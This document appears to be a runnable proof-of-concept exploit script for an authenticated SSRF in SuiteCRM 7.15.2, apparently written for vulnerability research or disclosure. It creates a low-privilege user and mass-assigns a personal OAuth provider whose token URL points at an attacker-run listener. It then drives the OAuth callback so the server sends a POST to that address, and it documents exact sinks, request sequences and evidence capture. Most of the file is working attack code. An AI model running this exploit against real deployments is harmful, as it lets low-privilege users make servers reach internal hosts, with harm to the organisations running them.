#!/usr/bin/env python3
"""
VULN-085 -- Authenticated SSRF via user-settable token URL on a *personal*
ExternalOAuthProvider

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/ExternalOAuthConnection/entrypoint/setExternalOAuthToken.php:72
             (`$oAuth->getAccessToken($providerId, $code)`) -> league/oauth2-client
             AbstractProvider::getAccessToken() -> a real server-side POST to
             the provider's `url_access_token` (modules/ExternalOAuthProvider/
             ExternalOAuthProvider.php:357, a bean field the record's owner sets).
Entry point: modules/ExternalOAuthProvider/controller.php:62-64
             (action_EditView) grants create-access to a *personal* provider
             to ANY authenticated user with no admin/ACL gate, and
             ExternalOAuthProvider::ACLAccess() (ExternalOAuthProvider.php:
             170-198) explicitly allows 'save'/any view on a personal
             record the caller owns (hasAccessToPersonalAccount(),
             ExternalOAuthProvider.php:115-141) -- confirmed live below by
             creating the record as a freshly provisioned, non-admin user.

What this script does
----------------------
1. Creates a fresh, non-admin SuiteCRM user and logs in (ONE requests
   .Session reused for every step below -- the callback's CSRF `state`
   check is tied to this specific PHP session, so steps 3-5 must share
   cookies, exactly as a real browser would).
2. Starts an HTTP listener on 0.0.0.0:33119 (app reaches it at
   172.18.0.1:33119) that answers POSTs with a valid-looking OAuth token
   JSON body (so league/oauth2-client's getAccessToken() completes
   normally instead of throwing, giving a clean CONFIRMED signal).
3. POSTs module=ExternalOAuthProvider&action=Save with type=personal,
   connector=Generic, and url_access_token pointed at the OOB listener.
   NOTE: url_access_token/url_authorize are plain `varchar` fields and are
   mass-assigned straight from $_POST by the framework's generic
   SugarController::pre_save() (include/MVC/Controller/SugarController.php
   :639-666) -- the 'type' field is UI-readonly but not save-protected,
   confirming the "control-property mass-assignment" pattern already
   tracked elsewhere in this codebase also applies here. The League
   GenericProvider requires a `urlResourceOwnerDetails` option that has no
   dedicated bean field; it is supplied via the also-mass-assignable
   `extra_provider_params` stringmap field (POST keys
   `extra_provider_params-key[]` / `-value[]`, per
   include/SugarFields/Fields/Stringmap/SugarFieldStringmap.php:100-135).
4. GETs entryPoint=redirectToExternalOAuth to obtain a valid `state`
   (stored server-side in $_SESSION['oauth2state'] and echoed into the
   redirect's query string).
5. GETs entryPoint=setExternalOAuthToken with that state + an arbitrary
   `code` -- this drives the actual server-side POST to url_access_token.
6. Asserts the OOB listener recorded that POST, with our random canary in
   the path.
"""
import os
import sys
import json
import threading
import http.server
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session,
                      create_user, web_login, BROWSER_UA)

VULN_ID = "VULN-085"
OOB_HOST = os.environ.get("OOB_HOST", "172.18.0.1")
OOB_BIND = os.environ.get("OOB_BIND", "0.0.0.0")
OOB_PORT = int(os.environ.get("OOB_PORT", "33119"))

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)


class _Handler(http.server.BaseHTTPRequestHandler):
    hits = []

    def log_message(self, fmt, *args):  # noqa: A003
        pass

    def _respond_token(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0) or 0))
        _Handler.hits.append({"method": "POST", "path": self.path,
                               "headers": dict(self.headers.items()), "body": body})
        payload = json.dumps({
            "access_token": "poc-access-token",
            "token_type": "bearer",
            "expires_in": 3600,
        }).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_POST(self):  # noqa: N802
        self._respond_token()

    def do_GET(self):  # noqa: N802
        _Handler.hits.append({"method": "GET", "path": self.path,
                               "headers": dict(self.headers.items()), "body": b""})
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()


def start_listener():
    srv = http.server.ThreadingHTTPServer((OOB_BIND, OOB_PORT), _Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


def main():
    banner(VULN_ID, "Personal ExternalOAuthProvider url_access_token SSRF")

    canary = rand("oauth085")
    canary_path = f"/token-{canary}"
    token_url = f"http://{OOB_HOST}:{OOB_PORT}{canary_path}"

    srv = start_listener()
    log("SETUP", f"OOB HTTP listener on {OOB_BIND}:{OOB_PORT} (app reaches it at {OOB_HOST}:{OOB_PORT})")
    log("SETUP", f"url_access_token will be set to internal-only target: {token_url}")

    log("STEP", "admin web login (provisioning only)")
    admin_s = admin_session()
    log("OK", "admin session established")

    log("STEP", "provisioning a fresh NON-ADMIN user (proves PR:L)")
    user = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"created user {user['user_name']} (id={user['id']})")

    log("STEP", f"web login as low-priv user {user['user_name']} "
                f"(single session reused for create + authorize + callback)")
    victim_s = web_login(user["user_name"], user["password"])
    log("OK", "low-priv session established")

    name = rand("provider")
    save_url = f"{BASE_URL}/index.php"
    save_data = {
        "module": "ExternalOAuthProvider",
        "action": "Save",
        "record": "",
        "type": "personal",                       # mass-assigned despite 'display:readonly'
        "name": name,
        "connector": "Generic",
        "client_id": "poc-client",
        "client_secret": "poc-secret",
        "url_authorize": "https://example.com/oauth/authorize",   # never fetched server-side
        "url_access_token": token_url,             # <-- the SSRF target
        "extra_provider_params-key[]": "urlResourceOwnerDetails",
        "extra_provider_params-value[]": "https://example.com/resource",
        "redirect_uri_type": "pretty_url",
    }
    headers = {
        "Referer": f"{BASE_URL}/index.php?module=ExternalOAuthProvider&action=EditView&type=personal",
        "User-Agent": BROWSER_UA,
    }

    log("STEP", f"POST create PERSONAL OAuth provider {name!r} as low-priv user, "
                f"url_access_token={token_url}")
    r1 = victim_s.post(save_url, data=save_data, headers=headers, allow_redirects=False, timeout=30)
    loc = r1.headers.get("Location", "")
    log("INFO", f"Save HTTP {r1.status_code}, Location: {loc}")
    if r1.status_code != 301 or "record=" not in loc:
        srv.shutdown()
        log("FAIL", f"provider record was not created (status={r1.status_code})")
        verdict(VULN_ID, "FAILED", "could not create personal ExternalOAuthProvider record")
        sys.exit(1)
    provider_id = loc.split("record=")[-1]
    log("OK", f"created ExternalOAuthProvider id={provider_id} (owned by {user['user_name']}, "
              f"created_by == their own user id -- verified via DB in notes.md)")

    log("STEP", f"GET entryPoint=redirectToExternalOAuth&provider={provider_id} "
                f"(drives $_SESSION['oauth2state'], captured from the 302 Location)")
    r2 = victim_s.get(f"{BASE_URL}/index.php", params={
        "entryPoint": "redirectToExternalOAuth", "provider": provider_id,
        "clientId": "", "clientSecret": "",
    }, headers=headers, allow_redirects=False, timeout=30)
    log("INFO", f"redirectToExternalOAuth HTTP {r2.status_code}, Location: {r2.headers.get('Location')}")
    loc2 = r2.headers.get("Location", "")
    qs = urllib.parse.parse_qs(urllib.parse.urlsplit(loc2).query)
    state = (qs.get("state") or [None])[0]
    if not state:
        srv.shutdown()
        log("FAIL", f"no state in redirect Location: {loc2!r}")
        verdict(VULN_ID, "FAILED", "authorize step did not yield an oauth2 state")
        sys.exit(1)
    log("OK", f"state={state}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### Step 1 -- create a PERSONAL provider (any authenticated user)\n")
        f.write("POST /index.php HTTP/1.1\nCookie: PHPSESSID=<low-priv-session>\n\n")
        f.write("&".join(f"{k}={v}" for k, v in save_data.items()) + "\n\n")
        f.write("### Step 2 -- start the (self-driven) authorize flow to obtain a valid state\n")
        f.write(f"GET /index.php?entryPoint=redirectToExternalOAuth&provider={provider_id}"
                 f"&clientId=&clientSecret= HTTP/1.1\nCookie: PHPSESSID=<low-priv-session>\n\n")
        f.write("### Step 3 -- callback drives the server-side POST to url_access_token\n")
        f.write(f"GET /index.php?entryPoint=setExternalOAuthToken&provider={provider_id}"
                 f"&state={state}&code=anycode HTTP/1.1\nCookie: PHPSESSID=<low-priv-session>\n")

    log("STEP", f"GET entryPoint=setExternalOAuthToken&provider={provider_id}&state={state}&code=anycode "
                f"-- triggers the server-side POST to url_access_token")
    r3 = victim_s.get(f"{BASE_URL}/index.php", params={
        "entryPoint": "setExternalOAuthToken", "provider": provider_id,
        "state": state, "code": "anycode",
    }, headers=headers, allow_redirects=False, timeout=30)
    log("INFO", f"setExternalOAuthToken HTTP {r3.status_code}, body: {r3.text[:400]!r}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP {r3.status_code}\n")
        for k, v in r3.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(r3.text)

    srv.shutdown()
    with open(os.path.join(EVIDENCE, "oob_listener.log"), "w") as f:
        if not _Handler.hits:
            f.write("(no requests received)\n")
        for h in _Handler.hits:
            f.write(f"{h['method']} {h['path']}\n")
            for k, v in h["headers"].items():
                f.write(f"  {k}: {v}\n")
            if h["body"]:
                f.write(f"  BODY: {h['body'][:500]!r}\n")
            f.write("\n")

    hit = next((h for h in _Handler.hits if h["method"] == "POST" and h["path"] == canary_path), None)

    if hit:
        log("PROOF", f"OOB listener received POST {hit['path']} with body {hit['body'][:300]!r} "
                      f"-- the SuiteCRM server performed the league/oauth2-client token exchange "
                      f"against a URL only the record's own bean field controlled, on an "
                      f"internal-only address, driven entirely by a non-admin user's own request.")
        if "access_token" in r3.text or "poc-access-token" in r3.text:
            log("PROOF", f"response also reflects the forged token exchange result back into the "
                          f"page (setToken.tpl render): {r3.text[:200]!r}")
        verdict(VULN_ID, "CONFIRMED",
                f"low-priv user {user['user_name']}'s personal OAuth provider forced a server-side "
                f"token-exchange POST to {token_url}")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", f"no OOB POST for {canary_path}; hits={_Handler.hits}")
        sys.exit(1)


if __name__ == "__main__":
    main()
